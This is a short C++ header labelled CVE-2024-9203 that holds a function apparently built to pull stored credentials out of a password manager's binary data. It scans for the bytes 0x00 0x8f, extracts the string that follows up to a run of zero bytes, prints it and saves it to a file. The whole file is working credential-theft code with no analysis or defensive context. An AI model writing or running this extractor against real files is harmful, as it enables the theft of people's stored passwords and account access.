#pragma once
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include "../core/saveFile.h"

/* CVE-2024-9203 */

int getCredsenpassEntries(std::string filename) {
    std::ifstream file(filename, std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error opening the file." << std::endl;
        return 1;
    }

    bool sequenceFound = false;
    unsigned char previousChar = 0;
    std::vector<unsigned char> buffer;
    int consecutiveZeros = 0;

    while (!file.eof()) {
        unsigned char c;
        file.read(reinterpret_cast<char*>(&c), sizeof(c));

        if (sequenceFound) {
            if (c == 0x00) {
                consecutiveZeros++;
                if (consecutiveZeros >= 50 && consecutiveZeros <= 65) {
                    // Check if the buffer size is not more than 100 bytes
                    if (buffer.size() <= 100) {
                        std::string utf8Data(buffer.begin(), buffer.end());
                        std::cout << utf8Data << std::endl;
                        // Convert the binary data to a UTF-8 string
                        std::string utf8ExtractedData(utf8Data.begin(), utf8Data.end());

                        // Print the extracted UTF-8 string
                        std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;

                        //Save into file
                        saveFile(utf8ExtractedData);

                    }
                    // Reset variables for the next search
                    sequenceFound = false;
                    buffer.clear();
                }
            }
            else {
                consecutiveZeros = 0;
                buffer.push_back(c); // Collect characters after the 0x00 0x8f sequence
            }
        }
        else if (previousChar == 0x00 && c == 0x8f) {
            sequenceFound = true; // Start collecting characters after this sequence
            consecutiveZeros = 0;
            buffer.clear(); // Clear buffer to start fresh collection
        }
        else {
            previousChar = c;
        }
    }

    file.close();
    return 0;
}
#pragma once
